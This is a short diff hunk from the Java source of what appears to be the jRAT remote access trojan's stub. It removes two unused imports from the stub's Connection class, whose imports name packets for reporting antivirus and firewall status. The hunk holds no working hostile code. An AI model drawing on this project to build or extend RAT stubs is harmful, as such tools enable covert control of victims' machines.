@@ -50,8 +50,6 @@ import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet69InitAntivirus;
 import se.jrat.stub.packets.outgoing.Packet70InitFirewall;
 
-import com.redpois0n.oslib.Arch;
-import com.redpois0n.oslib.OperatingSystem;
 import com.sun.management.OperatingSystemMXBean;
 
 public class Connection implements Runnable {
